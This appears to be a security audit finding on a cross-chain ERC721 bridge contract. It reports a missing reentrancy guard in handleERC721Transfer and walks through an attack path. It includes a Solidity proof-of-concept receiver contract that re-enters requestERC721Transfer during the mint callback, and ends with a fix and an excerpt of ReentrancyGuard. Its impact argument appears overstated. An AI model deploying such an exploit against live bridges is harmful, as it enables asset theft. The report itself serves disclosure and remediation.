### Title
Missing `nonReentrant` Guard on `handleERC721Transfer` Allows Malicious Recipient to Redirect Bridged ERC721 Tokens via `_safeMint` Callback — (`contracts/service_chain/bridge/BridgeTransferERC721.sol`)

---

### Summary

`BridgeTransferERC721.handleERC721Transfer` lacks a `nonReentrant` modifier. In `modeMintBurn`, it calls `ERC721MetadataMintable.mintWithTokenURI`, which internally calls OpenZeppelin's `_safeMint`. `_safeMint` triggers an `onERC721Received` callback to the `_to` address before the function returns. A malicious `_to` contract can exploit this callback to call the unguarded public `requestERC721Transfer` on the same bridge, creating a spurious cross-chain transfer request. The automated bridge operator processes this event, minting the token on the source chain to an attacker-controlled address. The inconsistency is confirmed by `handleKLAYTransfer`, which carries `nonReentrant`, showing the developers were aware of the risk for KLAY but missed it for ERC721.

---

### Finding Description

`handleERC721Transfer` in `BridgeTransferERC721.sol` has `onlyOperators` but no `nonReentrant`: [1](#0-0) 

The function updates all state (nonce, handled-request hash) and emits `HandleValueTransfer` **before** the external call, then in `modeMintBurn` calls:

```solidity
require(ERC721MetadataMintable(_tokenAddress).mintWithTokenURI(_to, _tokenId, _tokenURI), "mint failed");
```

`mintWithTokenURI` → `_safeMint` → `_checkOnERC721Received` → `IERC721Receiver(_to).onERC721Received(...)`. This callback fires while execution is still inside `handleERC721Transfer`.

The public, access-control-free `requestERC721Transfer` is the re-entry target: [2](#0-1) 

Inside `_requestERC721Transfer`, in `modeMintBurn`, the token is burned and a `RequestValueTransferEncoded` event is emitted, then `requestNonce` is incremented: [3](#0-2) 

By contrast, `handleKLAYTransfer` carries `nonReentrant`: [4](#0-3) 

---

### Impact Explanation

**Attack path (modeMintBurn, destination chain):**

1. Attacker deploys `MaliciousReceiver` on the destination chain. Its `onERC721Received` calls `bridge.requestERC721Transfer(tokenAddress, attackerEOA_on_source, tokenId, "")`.
2. Attacker on the source chain calls `requestERC721Transfer` with `_to = MaliciousReceiver`. Token X is burned on the source chain; `RequestValueTransfer` event emitted with nonce N.
3. Automated bridge operator calls `handleERC721Transfer` on the destination chain. State updated (nonce N marked handled). `mintWithTokenURI(MaliciousReceiver, tokenId, uri)` called.
4. During `_safeMint`, `MaliciousReceiver.onERC721Received` fires. `MaliciousReceiver` now owns token X (minted in step 3). It calls `bridge.requestERC721Transfer(tokenAddress, attackerEOA_on_source, tokenId, "")`.
5. Inside `requestERC721Transfer`: `transferFrom(MaliciousReceiver, bridge, tokenId)` succeeds (MaliciousReceiver is the owner). `_requestERC721Transfer` burns token X on the destination chain and emits `RequestValueTransferEncoded` with nonce M.
6. Automated bridge operator on the source chain observes nonce M and calls `handleERC721Transfer`. Token X is minted to `attackerEOA_on_source`.

**Net result:** Token X was burned on the source chain (step 2) and minted back to `attackerEOA_on_source` (step 6). The original sender expected the token to remain at `MaliciousReceiver` on the destination chain; instead it was silently redirected to the attacker's address on the source chain. Any user who sends an ERC721 to a malicious contract address (e.g., via a phishing UI) loses control of the asset.

The `onlyOperators` guard on `handleERC721Transfer` does **not** block this path because the re-entry target is `requestERC721Transfer`, which is `public` with no access control.

---

### Likelihood Explanation

- The `_to` address is user-supplied on the source chain; any user can set it to a malicious contract.
- The bridge operator is automated and processes all `RequestValueTransfer` events from the counterpart chain without additional verification of the event origin.
- The token must be registered and the bridge running — both are true for any active bridge pair.
- No privileged access is required beyond being a normal bridge user.

---

### Recommendation

Add `nonReentrant` to `handleERC721Transfer` (and `handleERC20Transfer` for consistency), mirroring the existing guard on `handleKLAYTransfer`:

```solidity
function handleERC721Transfer(
    ...
)
    public
    onlyOperators
    nonReentrant   // ← add this
{
    ...
}
```

`BridgeTransfer.sol` already imports `SafeMath`; add `ReentrancyGuard` as a base contract (it is already available in the OpenZeppelin v2 library bundled at `contracts/libs/openzeppelin-contracts-v2/contracts/utils/ReentrancyGuard.sol`). [5](#0-4)

### Proof of Concept

```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.5.6;

import "./BridgeTransferERC721.sol";

contract MaliciousReceiver {
    BridgeTransferERC721 public bridge;
    address public tokenAddress;
    address public attackerEOA;
    uint256 public capturedTokenId;

    constructor(address _bridge, address _token, address _attacker) public {
        bridge = BridgeTransferERC721(_bridge);
        tokenAddress = _token;
        attackerEOA = _attacker;
    }

    // Called by _safeMint during handleERC721Transfer
    function onERC721Received(
        address, uint256 tokenId, address, bytes memory
    ) public returns (bytes4) {
        capturedTokenId = tokenId;
        // Re-enter the bridge: transfer the just-minted token back as a new request
        // targeting attackerEOA on the source chain
        IERC721(tokenAddress).approve(address(bridge), tokenId);
        bridge.requestERC721Transfer(tokenAddress, attackerEOA, tokenId, "");
        return bytes4(keccak256("onERC721Received(address,uint256,address,bytes)"));
    }
}
```

**Steps:**
1. Deploy `MaliciousReceiver` on destination chain.
2. On source chain, call `requestERC721Transfer(token, MaliciousReceiver, tokenId, "")` — token burned on source.
3. Operator calls `handleERC721Transfer` on destination chain — `_safeMint` fires `onERC721Received`.
4. `MaliciousReceiver.onERC721Received` calls `bridge.requestERC721Transfer` — token burned on destination, spurious `RequestValueTransferEncoded` emitted.
5. Operator processes spurious event on source chain — token minted to `attackerEOA`.

contract ReentrancyGuard {
    /// @dev counter to allow mutex lock with only one SSTORE operation
    uint256 private _guardCounter;

    constructor () internal {
        // The counter starts at one to prevent changing it from zero to a non-zero
        // value, which is a more expensive operation.
        _guardCounter = 1;
    }

    /**
     * @dev Prevents a contract from calling itself, directly or indirectly.
     * Calling a `nonReentrant` function from another `nonReentrant`
     * function is not supported. It is possible to prevent this from happening
     * by making the `nonReentrant` function external, and make it call a
     * `private` function that does the actual work.
     */
    modifier nonReentrant() {
        _guardCounter += 1;
        uint256 localCounter = _guardCounter;
        _;
        require(localCounter == _guardCounter, "ReentrancyGuard: reentrant call");
    }
